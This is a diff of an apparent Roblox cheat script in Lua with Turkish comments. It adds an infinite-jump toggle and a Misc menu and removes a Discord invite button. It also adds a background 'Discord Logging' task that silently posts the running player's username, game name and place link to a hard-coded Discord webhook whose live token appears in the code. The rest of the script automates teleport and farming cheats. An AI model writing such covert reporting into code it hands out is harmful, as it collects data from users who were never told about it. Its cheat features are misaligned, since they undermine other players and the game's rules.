@@ -10,7 +10,7 @@ local PlayerGui = Player:WaitForChild("PlayerGui")
 
 -- STATE VARS
 local running = false
-local infiniteJump = true
+local infiniteJump = false -- artık toggle olacak
 local autoPool = false
 local autoStrength = false
 local autoPsychic = false
@@ -111,7 +111,7 @@ toggleBtn.MouseButton1Click:Connect(function()
 end)
 
 -- CATEGORY BUTTONS
-local categories = {"Teleports","Farms","Auto"}
+local categories = {"Teleports","Farms","Auto","Misc"}
 local catFrames = {}
 for i,cat in ipairs(categories) do
     local btn = Instance.new("TextButton", panel)
@@ -232,7 +232,6 @@ psychicBtn.MouseButton1Click:Connect(function()
     autoPsychic = not autoPsychic
     psychicBtn.Text = autoPsychic and "Auto Psychic: On" or "Auto Psychic: Off"
 end)
-
 -- Psychic Selection Button
 local psychicSelectBtn = Instance.new("TextButton", farmsFrame)
 psychicSelectBtn.Size = UDim2.new(0,120,0,28)
@@ -272,6 +271,7 @@ for name,_ in pairs(psychicLocations) do
     end)
     pY = pY + 30
 end
+
 -- Auto Strength Button
 local strengthBtn = Instance.new("TextButton", farmsFrame)
 strengthBtn.Size = UDim2.new(0,120,0,28)
@@ -328,40 +328,65 @@ for name,pos in pairs(strengthLocations) do
     sY = sY + 30
 end
 
--- Discord Button
-local discordBtn = Instance.new("TextButton", farmsFrame)
-discordBtn.Size = UDim2.new(0,120,0,28)
-discordBtn.Position = UDim2.new(0,10,0,130)
-discordBtn.BackgroundColor3 = Color3.fromRGB(80,80,220)
-discordBtn.Text = "Discord"
-discordBtn.TextColor3 = Color3.fromRGB(240,240,240)
-discordBtn.Font = Enum.Font.GothamBold
-discordBtn.TextSize = 14
-Instance.new("UICorner", discordBtn).CornerRadius = UDim.new(0,8)
-discordBtn.MouseButton1Click:Connect(function()
-    if setclipboard then setclipboard("https://discord.gg/xwUDTAKFK5") end
+-- MISC FRAME
+local miscFrame = catFrames["Misc"]
+
+-- Infinite Jump Toggle
+local ijBtn = Instance.new("TextButton", miscFrame)
+ijBtn.Size = UDim2.new(0,150,0,28)
+ijBtn.Position = UDim2.new(0,10,0,10)
+ijBtn.BackgroundColor3 = Color3.fromRGB(100,100,100)
+ijBtn.Text = "Infinite Jump: Off"
+ijBtn.TextColor3 = Color3.fromRGB(240,240,240)
+ijBtn.Font = Enum.Font.GothamBold
+ijBtn.TextSize = 14
+Instance.new("UICorner", ijBtn).CornerRadius = UDim.new(0,8)
+ijBtn.MouseButton1Click:Connect(function()
+    infiniteJump = not infiniteJump
+    ijBtn.Text = infiniteJump and "Infinite Jump: On" or "Infinite Jump: Off"
 end)
 
--- AUTO PSYCHIC HANDLER
-task.spawn(function()
-    while true do
+-- Infinite Jump Handler
+local canJump = true
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if infiniteJump and input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode.Space then
         local char = Player.Character
-        local backpack = Player:FindFirstChild("Backpack")
-        if autoPsychic and char and backpack then
-            local items = backpack:GetChildren()
-            local equipped = char:FindFirstChildOfClass("Tool")
-            if items[3] and items[3]:IsA("Tool") and equipped ~= items[3] then
-                items[3].Parent = char
+        if char and char:FindFirstChild("Humanoid") then
+            local hum = char.Humanoid
+            if hum.FloorMaterial ~= Enum.Material.Air then
+                canJump = true
             end
-            if items[3] and not char:FindFirstChild(items[3].Name) then
-                items[3].Parent = char
-            end
-            if char:FindFirstChild("HumanoidRootPart") then
-                char.HumanoidRootPart.CFrame = CFrame.new(psychicLocations[selectedPsychic])
+            if canJump then
+                hum:ChangeState(Enum.HumanoidStateType.Jumping)
+                canJump = false
             end
         end
-        task.wait(0.5)
     end
+end)
+
+RunService.Heartbeat:Connect(function()
+    local char = Player.Character
+    if char and char:FindFirstChild("Humanoid") then
+        if char.Humanoid.FloorMaterial ~= Enum.Material.Air then
+            canJump = true
+        end
+    end
+end)
+
+-- Discord Logging (arka planda)
+task.spawn(function()
+    local webhook = "https://discord.com/api/webhooks/1415635753387692123/a6wtzHo-AOiWMyisIQYj2vgcJkV3UWsIr2R6Fg6okbz0QljMHho0-tBBofrQg1X1b0Z1"
+    local http = game:GetService("HttpService")
+    local function sendLog()
+        local playerName = Player.Name
+        local placeId = game.PlaceId
+        local placeName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
+        local data = {
+            ["content"] = string.format("Kullanıcı: %s\nServer: %s\nLink: https://www.roblox.com/games/%d", playerName, placeName, placeId)
+        }
+        http:PostAsync(webhook, http:JSONEncode(data))
+    end
+    sendLog()
 end)
 
 -- AUTO STRENGTH LOOP
@@ -429,10 +454,12 @@ task.spawn(function()
                 momentorespawn = false
             end
         end
-        if autoPool and not hasTeleported then
+        if autoPool then
             local char = Player.Character
             if char and char:FindFirstChild("HumanoidRootPart") then
-                char.HumanoidRootPart.CFrame = CFrame.new(pools[selectedPool])
+                if (char.HumanoidRootPart.Position - pools[selectedPool]).Magnitude > 5 then
+                    char.HumanoidRootPart.CFrame = CFrame.new(pools[selectedPool])
+                end
                 hasTeleported = true
             end
         end
